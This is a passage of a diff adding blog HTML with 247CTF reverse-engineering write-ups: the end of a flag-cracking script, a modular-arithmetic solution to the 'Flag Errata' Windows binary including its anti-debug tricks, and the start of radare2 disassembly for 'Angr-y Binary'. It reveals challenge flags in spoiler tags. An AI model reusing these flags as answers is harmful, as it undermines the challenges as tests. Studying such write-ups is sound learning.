<span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;c&#125;</span> | Current: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to crack.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="result">Result</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line">[+] 247CTF&#123;********************************&#125;</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{167d16d4a0d05da530c941dd23ff0238}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-flag-errata/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-flag-errata/" class="post-title-link" itemprop="url">247CTF - Flag Errata</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-09 23:51:18" itemprop="dateCreated datePublished" datetime="2026-03-09T23:51:18+08:00">2026-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-10 01:00:11" itemprop="dateModified" datetime="2026-03-10T01:00:11+08:00">2026-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-flag-errata/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-flag-errata/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>We stored the flag within this binary, but made a few errors when
+trying to print it. Can you make use of these errors to recover the
+flag?</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file flag_errata.exe</span><br><span class="line">flag_errata.exe: PE32+ executable <span class="keyword">for</span> MS Windows 5.02 (console), x86-64 (stripped to external PDB), 9 sections</span><br></pre></td></tr></table></figure>
+<p>A PE64 binary (GCC 7.3 / MinGW-w64) with a monstrous 53KB
+<code>main</code> function. It prompts for a 40-character password,
+validates each character through error-code accumulation, then returns
+<code>-247</code> on any mismatch.</p>
+<p>The core pattern repeats 40 times:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_401560();                    <span class="comment">// intentionally failing WinAPI call</span></span><br><span class="line">LastError = GetLastError();      <span class="comment">// harvest the error code</span></span><br><span class="line">sub_40159B();</span><br><span class="line">v5 = GetLastError() + LastError; <span class="comment">// accumulate</span></span><br><span class="line">sub_4015D6();</span><br><span class="line">v6 = GetLastError() + v5;</span><br><span class="line"><span class="comment">// ... N calls total ...</span></span><br><span class="line"><span class="keyword">if</span> ( Buffer[i] != (<span class="type">int</span>)(accumulated) % <span class="number">126</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-247</span>;                 <span class="comment">// failure — 247CTF signature</span></span><br></pre></td></tr></table></figure>
+<p>The password is never stored anywhere. It’s implicitly encoded by the
+<em>count</em> and <em>sequence</em> of WinAPI calls whose error codes
+reconstruct each character.</p>
+<h2 id="the-error-code-cycle">The Error Code Cycle</h2>
+<p>13 functions form a fixed cycle, each designed to fail
+deterministically:</p>
+<table>
+<colgroup>
+<col style="width: 2%" />
+<col style="width: 27%" />
+<col style="width: 7%" />
+<col style="width: 40%" />
+<col style="width: 19%" />
+<col style="width: 3%" />
+</colgroup>
+<thead>
+<tr>
+<th>#</th>
+<th>Function</th>
+<th>Address</th>
+<th>API Call</th>
+<th>Expected Error</th>
+<th>Code</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td><code>errgen_open_247ctf_dll_system32</code></td>
+<td><code>0x401560</code></td>
+<td><code>CreateFileA("C:\Windows\System32\247CTF.dll", ...)</code></td>
+<td><code>ERROR_FILE_NOT_FOUND</code></td>
+<td>2</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>errgen_open_247ctf_dll_nested</code></td>
+<td><code>0x40159B</code></td>
+<td><code>CreateFileA("C:\247CTF\247CTF\247CTF.dll", ...)</code></td>
+<td><code>ERROR_PATH_NOT_FOUND</code></td>
+<td>3</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>errgen_open_user32_dll_readwrite</code></td>
+<td><code>0x4015D6</code></td>
+<td><code>CreateFileA("user32.dll", GENERIC_RW, exclusive)</code></td>
+<td><code>ERROR_SHARING_VIOLATION</code></td>
+<td>32</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>errgen_getthreadtimes_null</code></td>
+<td><code>0x401611</code></td>
+<td><code>GetThreadTimes(0, 0, 0, 0, 0)</code></td>
+<td><code>ERROR_INVALID_HANDLE</code></td>
+<td>6</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>errgen_findfiles_exhaust</code></td>
+<td><code>0x401634</code></td>
+<td><code>FindFirstFile("C:\*")</code> + loop
+<code>FindNextFile</code></td>
+<td><code>ERROR_NO_MORE_FILES</code></td>
+<td>18</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>errgen_virtualqueryex_null</code></td>
+<td><code>0x401674</code></td>
+<td><code>VirtualQueryEx(proc, NULL, NULL, 8)</code></td>
+<td><code>ERROR_BAD_LENGTH</code></td>
+<td>24</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>errgen_open_cmdexe_twice</code></td>
+<td><code>0x401697</code></td>
+<td><code>CreateFileA("cmd.exe")</code> x2 (exclusive)</td>
+<td><code>ERROR_SHARING_VIOLATION</code></td>
+<td>32</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>errgen_open_user32_invalid_create</code></td>
+<td><code>0x401704</code></td>
+<td><code>CreateFileA("user32.dll", ..., dwCreation=0)</code></td>
+<td><code>ERROR_INVALID_PARAMETER</code></td>
+<td>87</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>errgen_setconsoledisplaymode</code></td>
+<td><code>0x40173F</code></td>
+<td><code>SetConsoleDisplayMode(FULLSCREEN)</code></td>
+<td>Varies by OS</td>
+<td>~87</td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>errgen_open_247ctf_colon</code></td>
+<td><code>0x401764</code></td>
+<td><code>CreateFileA("247CTF:", ...)</code></td>
+<td><code>ERROR_INVALID_NAME</code></td>
+<td>123</td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>errgen_loadlibrary_fake_dll</code></td>
+<td><code>0x4017A2</code></td>
+<td><code>LoadLibraryA("C:\247CTF.DLL")</code></td>
+<td><code>ERROR_MOD_NOT_FOUND</code></td>
+<td>126</td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>errgen_createmutex_twice</code></td>
+<td><code>0x4017B0</code></td>
+<td><code>CreateMutexA("247CTF")</code> x2</td>
+<td><code>ERROR_ALREADY_EXISTS</code></td>
+<td>183</td>
+</tr>
+<tr>
+<td>12</td>
+<td><code>errgen_createprocess_user32</code></td>
+<td><code>0x4017DF</code></td>
+<td><code>CreateProcessA("user32.dll" as exe)</code></td>
+<td><code>ERROR_BAD_EXE_FORMAT</code></td>
+<td>193</td>
+</tr>
+</tbody>
+</table>
+<p>Each character block calls <span
+class="math inline"><em>N</em></span> consecutive functions from this
+cycle, accumulates the error codes, then checks <code>sum % 126</code>
+against the input.</p>
+<h2 id="algebraic-solution">Algebraic Solution</h2>
+<p>The key insight: since the error codes cycle deterministically, we
+can bypass the Windows environment entirely and solve this as pure
+modular arithmetic.</p>
+<p>I use Arch BTW.</p>
+<p>Let:</p>
+<ul>
+<li><span class="math inline">$S = \sum_{k=0}^{12} e_k$</span>, the sum
+of one full cycle (all 13 error codes)</li>
+<li><span class="math inline">$P(r) = \sum_{k=0}^{r-1} e_k$</span>, the
+partial sum of the first <span class="math inline"><em>r</em></span>
+codes</li>
+</ul>
+<p>For character <span class="math inline"><em>i</em></span> with <span
+class="math inline"><em>n</em><sub><em>i</em></sub></span> total API
+calls:</p>
+<p><span class="math display">$$q_i = \left\lfloor \frac{n_i}{13}
+\right\rfloor, \qquad r_i = n_i \bmod 13$$</span></p>
+<p><span
+class="math display">password[<em>i</em>] ≡ <em>q</em><sub><em>i</em></sub> ⋅ <em>S</em> + <em>P</em>(<em>r</em><sub><em>i</em></sub>) (mod  126)</span></p>
+<p>The flag format <code>247CTF&#123;...&#125;</code> gives us 8 known characters
+for free. Three of them — blocks 2, 3, 6 — share the same remainder
+<span class="math inline"><em>r</em> = 9</span>: same position in the
+error-code cycle, different lap counts. Shared <span
+class="math inline"><em>P</em>(9)</span> cancels on subtraction.</p>
+<p>Blocks 2, 3, 6 correspond to <code>7</code> (ASCII <span
+class="math inline">55</span>, <span
+class="math inline"><em>q</em> = 16</span>), <code>C</code> (<span
+class="math inline">67</span>, <span
+class="math inline"><em>q</em> = 10</span>), <code>&#123;</code> (<span
+class="math inline">123</span>, <span
+class="math inline"><em>q</em> = 24</span>):</p>
+<p><span class="math display">$$\begin{aligned}
+16S + P(9) &amp;\equiv 55 \pmod{126}  &amp;&amp; \quad (1) \\
+10S + P(9) &amp;\equiv 67 \pmod{126}  &amp;&amp; \quad (2) \\
+24S + P(9) &amp;\equiv 123 \pmod{126} &amp;&amp; \quad (3)
+\end{aligned}$$</span></p>
+<p>Subtracting <span class="math inline">(2)</span> from <span
+class="math inline">(1)</span> eliminates <span
+class="math inline"><em>P</em>(9)</span>:</p>
+<p><span class="math display">$$\begin{aligned}
+(16 - 10)\,S &amp;\equiv 55 - 67 \pmod{126} \\
+6S &amp;\equiv -12 \equiv 114 \pmod{126}
+\end{aligned}$$</span></p>
+<p>Since <span class="math inline">gcd (6, 126) = 6</span> divides <span
+class="math inline">114</span>, we may divide the entire congruence by
+<span class="math inline">6</span> (reducing the modulus to <span
+class="math inline">126/6 = 21</span>):</p>
+<p><span
+class="math display"><em>S</em> ≡ 19 (mod  21)   ⇒   <em>S</em> ∈ {19, 40, 61, 82, 103, 124}</span></p>
+<p>Similarly, <span class="math inline">(3) − (1)</span> yields a second
+constraint:</p>
+<p><span class="math display">$$\begin{aligned}
+8S &amp;\equiv 68 \pmod{126} \\
+4S &amp;\equiv 34 \pmod{63} &amp;&amp; \quad (\text{dividing by }
+\gcd(2, 126) = 2)
+\end{aligned}$$</span></p>
+<p>To isolate <span class="math inline"><em>S</em></span>, multiply both
+sides by the modular inverse <span
+class="math inline">4<sup>−1</sup> ≡ 16 (mod  63)</span>, since <span
+class="math inline">4 × 16 = 64 ≡ 1</span>:</p>
+<p><span
+class="math display"><em>S</em> ≡ 16 × 34 = 544 ≡ 40 (mod  63)</span></p>
+<p>Intersecting via CRT: <span
+class="math inline">40 mod  21 = 19 ✓</span>, so both congruences
+agree.</p>
+<p><span class="math display">$$\boxed{\,S = 40\,}$$</span></p>
+<p>Back-substituting into <span class="math inline">(1)</span>:</p>
+<p><span class="math display">$$\begin{aligned}
+16 \times 40 + P(9) &amp;\equiv 55 \pmod{126} \\
+640 + P(9) &amp;\equiv 55 \pmod{126} \\
+10 + P(9) &amp;= 55 &amp;&amp; \quad (640 \bmod 126 = 10) \\
+P(9) &amp;= 45
+\end{aligned}$$</span></p>
+<p>Same process with the remaining known characters fills all partial
+sums:</p>
+<table>
+<thead>
+<tr>
+<th><span class="math inline"><em>P</em>(<em>r</em>)</span></th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="math inline"><em>P</em>(3)</span></td>
+<td>10</td>
+<td><code>'2'</code> (ASCII 50)</td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(4)</span></td>
+<td>16</td>
+<td><span class="math inline"><em>e</em><sub>3</sub> = 6</span></td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(5)</span></td>
+<td>34</td>
+<td><span class="math inline"><em>e</em><sub>4</sub> = 18</span></td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(6)</span></td>
+<td>58</td>
+<td><code>'4'</code> (ASCII 52)</td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(7)</span></td>
+<td>90</td>
+<td><code>'T'</code> (ASCII 84)</td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(9)</span></td>
+<td>45</td>
+<td><code>'7'</code> (ASCII 55)</td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(10)</span></td>
+<td>42</td>
+<td><code>'F'</code> (ASCII 70)</td>
+</tr>
+<tr>
+<td><span class="math inline"><em>P</em>(12)</span></td>
+<td>99</td>
+<td><span
+class="math inline"><em>e</em><sub>10</sub>, <em>e</em><sub>11</sub></span></td>
+</tr>
+</tbody>
+</table>
+<p>With <span class="math inline"><em>S</em></span> and all <span
+class="math inline"><em>P</em>(<em>r</em>)</span> determined, every
+character computes directly:</p>
+<table>
+<thead>
+<tr>
+<th>Block</th>
+<th>Calls</th>
+<th><span class="math inline"><em>q</em></span></th>
+<th><span class="math inline"><em>r</em></span></th>
+<th>Calculation</th>
+<th>Char</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>16</td>
+<td>1</td>
+<td>3</td>
+<td><span class="math inline">(40 + 10) mod  126</span></td>
+<td><code>2</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>191</td>
+<td>14</td>
+<td>9</td>
+<td><span class="math inline">(560 + 45) mod  126</span></td>
+<td><code>e</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>109</td>
+<td>8</td>
+<td>5</td>
+<td><span class="math inline">(320 + 34) mod  126</span></td>
+<td><code>f</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td>285</td>
+<td>21</td>
+<td>12</td>
+<td><span class="math inline">(840 + 99) mod  126</span></td>
+<td><code>9</code></td>
+</tr>
+<tr>
+<td>20</td>
+<td>298</td>
+<td>22</td>
+<td>12</td>
+<td><span class="math inline">(880 + 99) mod  126</span></td>
+<td><code>a</code></td>
+</tr>
+<tr>
+<td>39</td>
+<td>35</td>
+<td>2</td>
+<td>9</td>
+<td><span class="math inline">(80 + 45) mod  126</span></td>
+<td><code>&#125;</code></td>
+</tr>
+</tbody>
+</table>
+<p>All 40 characters land in the valid charset — <code>247CTF&#123;</code>
+prefix, <code>[0-9a-f]</code> hex body, <code>&#125;</code> suffix —
+confirming the solution without ever running the binary.</p>
+<h3 id="character-by-character-breakdown">Character-by-Character
+Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Block</th>
+<th>Calls</th>
+<th>q</th>
+<th>r</th>
+<th>Formula</th>
+<th>Char</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>16</td>
+<td>1</td>
+<td>3</td>
+<td>(1*40+10)%126=50</td>
+<td><code>2</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td>45</td>
+<td>3</td>
+<td>6</td>
+<td>(3*40+58)%126=52</td>
+<td><code>4</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>217</td>
+<td>16</td>
+<td>9</td>
+<td>(16*40+45)%126=55</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>139</td>
+<td>10</td>
+<td>9</td>
+<td>(10*40+45)%126=67</td>
+<td><code>C</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>46</td>
+<td>3</td>
+<td>7</td>
+<td>(3*40+90)%126=84</td>
+<td><code>T</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>101</td>
+<td>7</td>
+<td>10</td>
+<td>(7*40+42)%126=70</td>
+<td><code>F</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>321</td>
+<td>24</td>
+<td>9</td>
+<td>(24*40+45)%126=123</td>
+<td><code>&#123;</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>191</td>
+<td>14</td>
+<td>9</td>
+<td>(14*40+45)%126=101</td>
+<td><code>e</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>280</td>
+<td>21</td>
+<td>7</td>
+<td>(21*40+90)%126=48</td>
+<td><code>0</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>109</td>
+<td>8</td>
+<td>5</td>
+<td>(8*40+34)%126=102</td>
+<td><code>f</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>19</td>
+<td>1</td>
+<td>6</td>
+<td>(1*40+58)%126=98</td>
+<td><code>b</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td>256</td>
+<td>19</td>
+<td>9</td>
+<td>(19*40+45)%126=49</td>
+<td><code>1</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td>109</td>
+<td>8</td>
+<td>5</td>
+<td>(8*40+34)%126=102</td>
+<td><code>f</code></td>
+</tr>
+<tr>
+<td>13</td>
+<td>241</td>
+<td>18</td>
+<td>7</td>
+<td>(18*40+90)%126=54</td>
+<td><code>6</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td>215</td>
+<td>16</td>
+<td>7</td>
+<td>(16*40+90)%126=100</td>
+<td><code>d</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td>285</td>
+<td>21</td>
+<td>12</td>
+<td>(21*40+99)%126=57</td>
+<td><code>9</code></td>
+</tr>
+<tr>
+<td>16</td>
+<td>17</td>
+<td>1</td>
+<td>4</td>
+<td>(1*40+16)%126=56</td>
+<td><code>8</code></td>
+</tr>
+<tr>
+<td>17</td>
+<td>215</td>
+<td>16</td>
+<td>7</td>
+<td>(16*40+90)%126=100</td>
+<td><code>d</code></td>
+</tr>
+<tr>
+<td>18</td>
+<td>217</td>
+<td>16</td>
+<td>9</td>
+<td>(16*40+45)%126=55</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>19</td>
+<td>215</td>
+<td>16</td>
+<td>7</td>
+<td>(16*40+90)%126=100</td>
+<td><code>d</code></td>
+</tr>
+<tr>
+<td>20</td>
+<td>298</td>
+<td>22</td>
+<td>12</td>
+<td>(22*40+99)%126=97</td>
+<td><code>a</code></td>
+</tr>
+<tr>
+<td>21</td>
+<td>285</td>
+<td>21</td>
+<td>12</td>
+<td>(21*40+99)%126=57</td>
+<td><code>9</code></td>
+</tr>
+<tr>
+<td>22</td>
+<td>280</td>
+<td>21</td>
+<td>7</td>
+<td>(21*40+90)%126=48</td>
+<td><code>0</code></td>
+</tr>
+<tr>
+<td>23</td>
+<td>215</td>
+<td>16</td>
+<td>7</td>
+<td>(16*40+90)%126=100</td>
+<td><code>d</code></td>
+</tr>
+<tr>
+<td>24</td>
+<td>217</td>
+<td>16</td>
+<td>9</td>
+<td>(16*40+45)%126=55</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>25</td>
+<td>12</td>
+<td>0</td>
+<td>12</td>
+<td>(0*40+99)%126=99</td>
+<td><code>c</code></td>
+</tr>
+<tr>
+<td>26</td>
+<td>38</td>
+<td>2</td>
+<td>12</td>
+<td>(2*40+99)%126=53</td>
+<td><code>5</code></td>
+</tr>
+<tr>
+<td>27</td>
+<td>12</td>
+<td>0</td>
+<td>12</td>
+<td>(0*40+99)%126=99</td>
+<td><code>c</code></td>
+</tr>
+<tr>
+<td>28</td>
+<td>191</td>
+<td>14</td>
+<td>9</td>
+<td>(14*40+45)%126=101</td>
+<td><code>e</code></td>
+</tr>
+<tr>
+<td>29</td>
+<td>109</td>
+<td>8</td>
+<td>5</td>
+<td>(8*40+34)%126=102</td>
+<td><code>f</code></td>
+</tr>
+<tr>
+<td>30</td>
+<td>16</td>
+<td>1</td>
+<td>3</td>
+<td>(1*40+10)%126=50</td>
+<td><code>2</code></td>
+</tr>
+<tr>
+<td>31</td>
+<td>217</td>
+<td>16</td>
+<td>9</td>
+<td>(16*40+45)%126=55</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>32</td>
+<td>12</td>
+<td>0</td>
+<td>12</td>
+<td>(0*40+99)%126=99</td>
+<td><code>c</code></td>
+</tr>
+<tr>
+<td>33</td>
+<td>16</td>
+<td>1</td>
+<td>3</td>
+<td>(1*40+10)%126=50</td>
+<td><code>2</code></td>
+</tr>
+<tr>
+<td>34</td>
+<td>109</td>
+<td>8</td>
+<td>5</td>
+<td>(8*40+34)%126=102</td>
+<td><code>f</code></td>
+</tr>
+<tr>
+<td>35</td>
+<td>45</td>
+<td>3</td>
+<td>6</td>
+<td>(3*40+58)%126=52</td>
+<td><code>4</code></td>
+</tr>
+<tr>
+<td>36</td>
+<td>217</td>
+<td>16</td>
+<td>9</td>
+<td>(16*40+45)%126=55</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>37</td>
+<td>285</td>
+<td>21</td>
+<td>12</td>
+<td>(21*40+99)%126=57</td>
+<td><code>9</code></td>
+</tr>
+<tr>
+<td>38</td>
+<td>17</td>
+<td>1</td>
+<td>4</td>
+<td>(1*40+16)%126=56</td>
+<td><code>8</code></td>
+</tr>
+<tr>
+<td>39</td>
+<td>35</td>
+<td>2</td>
+<td>9</td>
+<td>(2*40+45)%126=125</td>
+<td><code>&#125;</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="anti-analysis">Anti-Analysis</h2>
+<ul>
+<li><strong>TLS Callbacks</strong>: Two callbacks
+(<code>0x401C50</code>, <code>0x401C20</code>) execute before
+<code>main</code> — a common anti-debug vector.</li>
+<li><strong>53KB of bloat</strong>: Up to 321 API calls per character,
+making manual static analysis impractical without scripting.</li>
+<li><strong>Environment sensitivity</strong>: Functions like
+<code>CreateProcessA</code> and <code>SetConsoleDisplayMode</code>
+return different error codes under a debugger, making dynamic analysis a
+trap. The algebraic approach sidesteps this entirely by reasoning at the
+mathematical level, independent of the Windows runtime.</li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{e0fb1f6d98d7da90d7c5cef27c2f4798}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-Angr-y-Binary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-Angr-y-Binary/" class="post-title-link" itemprop="url">247CTF - Angr-y Binary</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-08 16:59:31 / Modified: 17:12:30" itemprop="dateCreated datePublished" datetime="2026-03-08T16:59:31+08:00">2026-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-Angr-y-Binary/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-Angr-y-Binary/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Why waste time creating multiple functions, when you can just use
+one? Can you find the path to the flag in this angr-y binary?</p>
+</blockquote>
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p>The challenge provides a 32-bit ELF executable. The goal is to find
+the correct input that leads to the flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file angr-y_binary</span><br><span class="line">angr-y_binary: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=611e939f262f927b8515162283d36476df2d3244, not stripped</span><br></pre></td></tr></table></figure>
+<h2 id="analysis">Analysis</h2>
+<p>Using <code>radare2</code> to inspect the disassembly, we identify
+three key functions: <code>print_flag</code>, <code>no_flag</code>, and
+<code>maybe_flag</code>.</p>
+<h3 id="disassembly">Disassembly</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">     ;-- print_flag:</span><br><span class="line">     0x08048596      55             push ebp</span><br><span class="line">     0x08048597      89e5           mov ebp, esp</span><br><span class="line">     ...</span><br><span class="line">     0x080485db      e830feffff     call sym.imp.fgets          ;[3]</span><br><span class="line">     0x080485e0      83c410         add esp, 0x10</span><br><span class="line">     0x080485e3      83ec0c         sub esp, 0xc</span><br><span class="line">     0x080485e6      8d45b4         lea eax, [ebp - 0x4c]</span><br><span class="line">     0x080485e9      50             push eax</span><br><span class="line">     0x080485ea      e841feffff     call sym.imp.puts           ;[4]</span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">     ;-- no_flag:</span><br><span class="line">     0x08048609      55             push ebp</span><br><span class="line">     0x0804860a      89e5           mov ebp, esp</span><br><span class="line">     0x0804860c      e8d0005e00     call sym.__x86.get_pc_thunk.ax ;[6]</span><br><span class="line">     0x08048611      05ef195e00     add eax, 0x5e19ef</span><br><span class="line">     0x08048616      c780300000..   mov dword [eax + 0x30], 0</span><br><span class="line">     0x08048620      90             nop</span><br><span class="line">     0x08048621      5d             pop ebp</span><br><span class="line">     0x08048622      c3             ret</span><br><span class="line"></span><br><span class="line">     ;-- maybe_flag:</span><br><span class="line">     0x08048623      55             push ebp</span><br><span class="line">     0x08048624      89e5           mov ebp, esp</span><br><span class="line">     0x08048626      53         